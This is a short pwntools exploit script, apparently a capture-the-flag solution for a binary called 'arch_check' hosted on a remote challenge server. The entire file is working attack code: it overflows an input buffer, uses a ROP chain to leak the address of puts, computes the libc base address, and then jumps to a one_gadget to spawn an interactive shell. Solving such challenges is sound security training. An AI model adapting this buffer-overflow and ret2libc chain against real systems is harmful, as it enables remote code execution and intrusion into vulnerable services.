from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# context.log_level = 'debug'

libc = ELF("./libc6_2.31-0ubuntu9.3_amd64.so")
elf = ELF("./arch_check_patched")  # patched using patchelf with correct libc and linker
rop = ROP(elf)
# io = process("./arch_check_patched")
io = remote("up.zoolab.org", 30001)

sh = 0x403008
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
chain = flat([pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]])
io.sendlineafter(b"using?\n", b"a" * 40 + chain)
io.recvline()
puts = int.from_bytes(io.recv(6), "little")
libc_base = puts - libc.sym["puts"]
print(f"{libc_base = :#x}")

gadget = libc_base + 0xE6C81
chain = flat([gadget])
io.sendlineafter(b"using?\n", b"a" * 40 + chain)
io.interactive()
